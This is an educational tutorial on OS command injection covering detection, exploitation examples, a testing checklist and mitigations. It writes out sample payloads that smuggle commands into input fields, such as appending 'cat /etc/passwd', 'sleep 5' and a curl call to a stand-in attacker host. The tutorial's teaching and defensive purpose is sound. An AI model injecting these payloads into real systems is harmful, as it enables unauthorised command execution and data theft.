# Day 3: Command Injection  

## 📖 Overview  
Command Injection is a critical vulnerability that occurs when an application improperly processes user input, allowing attackers to execute arbitrary system commands on the server. This can lead to unauthorized access, data theft, and system compromise.  

---

## 🚩 Key Concepts  

### **What is Command Injection?**  
Command Injection occurs when:  
- User-supplied input is included in system commands without proper sanitization or validation.  
- Attackers exploit this to manipulate the executed commands or run their own malicious commands.  

### **Types of Command Injection**  
1. **Classic Command Injection**: Direct execution of malicious commands.  
2. **Blind Command Injection**: No direct feedback from the application, but the attack’s effects (e.g., delays, external communications) confirm success.  

---

## 🔍 **How to Identify Command Injection**  

### 🌐 **Common Injection Points**  
1. **File Uploads**: Exploiting scripts handling file paths (e.g., `/var/tmp/; cat /etc/passwd`).  
2. **Shell Commands**: Inputs passed to shell utilities like `ls`, `ping`, `cat`.  
3. **API Endpoints**: Parameters triggering shell commands.  
4. **Forms**: Fields accepting user input that interact with system commands.  

---

## **Step-by-Step Process to Find Command Injection Vulnerabilities**  

### **1. Analyze Inputs**  
- Identify inputs that might influence system-level operations (e.g., ping utilities, file handlers).  

### **2. Test for Injection**  
- Use special characters to test if input alters the command execution flow:  
  - `;`, `|`, `&&`, `||`, `>`, `<`.  

### **3. Observe Responses**  
- Look for unexpected outputs or errors indicating command execution.  
- For blind injection, observe external effects (e.g., delays or network interactions).  

---

## 🛠️ **Exploitation Steps**  

### **Example 1: Testing with Basic Payloads**  
- Original input: `192.168.1.1` (expected IP address)  
- Malicious input: `192.168.1.1; cat /etc/passwd`  

If the server outputs the contents of `/etc/passwd`, it’s vulnerable.  

### **Example 2: Blind Command Injection via Delays**  
1. Input payload: `192.168.1.1 && sleep 5`  
2. Observe delay in response to confirm vulnerability.  

### **Example 3: Outbound Communication**  
1. Inject payload: `192.168.1.1 && curl http://attacker.com`  
2. Check if the attacker server receives the request.  

---

## **Command Injection Vulnerability Checklist**  

### **1. Reconnaissance**  
- [ ] Identify areas interacting with OS commands (e.g., IP address fields, file operations).  

### **2. Testing**  
- [ ] Test special characters (`;`, `|`, `&&`) to break command structure.  
- [ ] Use payloads to extract sensitive information or confirm execution:  
  - `; ls /`  
  - `; whoami`  

### **3. Verification**  
- [ ] Confirm successful command execution through output or external indicators (e.g., DNS queries, delays).  

---

## 🔒 **Mitigation Strategies**  

1. **Avoid Shell Commands**: Use APIs or system libraries for OS-level interactions instead of executing shell commands.  
2. **Input Validation**: Validate and sanitize all user inputs to ensure they do not include malicious characters.  
3. **Escape Inputs**: Use functions like `shlex.quote()` (Python) to safely escape shell inputs.  
4. **Principle of Least Privilege**: Restrict user permissions to limit the impact of potential exploitation.  
5. **Use Security Tools**: Implement Web Application Firewalls (WAFs) to detect and block command injection attempts.  

---

## 💻 **Hands-on Practice**  
- Try command injection labs on:  
  - PortSwigger Web Security Academy [https://portswigger.net/web-security/os-command-injection]  
  - OWASP Juice Shop [https://owasp.org/www-project-juice-shop/]  

---

## 🛠️ **Resources**  
- [OWASP Command Injection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Command_Injection.html)  
- [GTFOBins](https://gtfobins.github.io/)  
